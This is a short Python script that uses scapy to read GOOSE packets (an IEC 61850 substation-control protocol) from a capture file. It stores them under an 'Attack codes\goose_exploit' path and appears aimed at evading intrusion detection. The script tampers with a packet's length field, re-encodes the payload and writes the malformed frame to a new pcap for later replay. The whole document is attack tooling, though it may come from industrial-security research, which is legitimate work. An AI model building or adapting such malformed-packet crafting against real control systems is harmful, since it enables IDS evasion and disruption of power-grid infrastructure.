from gooseFunc import *
from scapy.all import *

GOOSE_TYPE = 0x88b8

# Load packets from the pcap file
packets = rdpcap('Attack codes\goose_exploit\ids_bust_boolean.pcapng')

g_packets = []  # List to store GOOSE packets

# Identify and collect GOOSE packets
for packet in packets:
    if goose_check(packet, GOOSE_TYPE):                                  
        g_packets.append(packet)

# Assuming g_packets has at least one GOOSE packet
if g_packets:
    # Take the first GOOSE packet for modification
    mod_packet = g_packets[0]

    # Extracting the GOOSE header (8 Bytes: APPID, Length, Reserved 1, Reserved 2)
    mod_packet_load_start_goose = mod_packet.load[:8]
    # Extracting the allData payload from the end (6 bytes)
    mod_packet_load_end_alldata = mod_packet.load[-6:]

    # Parse the GOOSE packet using your defined structure
    mod_data = GOOSE(mod_packet.load)
    mod_pdu = mod_data[GOOSEPDU].original

    # Modify the length field (example adding 34 bytes to length)
    print(f"Packet Length: {mod_data.length}")
    new_length = mod_data.length + 34

    # Modify mod_data in-place
    mod_data.length = new_length

    # Encode the modified GOOSE PDU (ASN.1/BER encoding)
    encoded_data = encoder.encode(gooseAllData_decode(mod_pdu))

    # Rebuild the modified packet (GOOSE header + modified payload + remaining data structure)
    mod_packet.load = mod_packet_load_start_goose + pack('!H', new_length) + mod_packet.load[10:12] + encoded_data + mod_packet_load_end_alldata

    # Print the modified packet details
    print("\nModified Frame:")
    mod_packet.show()

    # Save the modified packet to a new pcap file
    f_name = 'Attack codes\goose_exploit\s1.pcapng'
    wrpcap(f_name, mod_packet, append=True)

    # Verify the modified packet's length
    test_data = GOOSE(mod_packet.load)
    print(f"Modified Packet Length: {test_data.length}")

else:
    print("No GOOSE packets found in the capture file.")
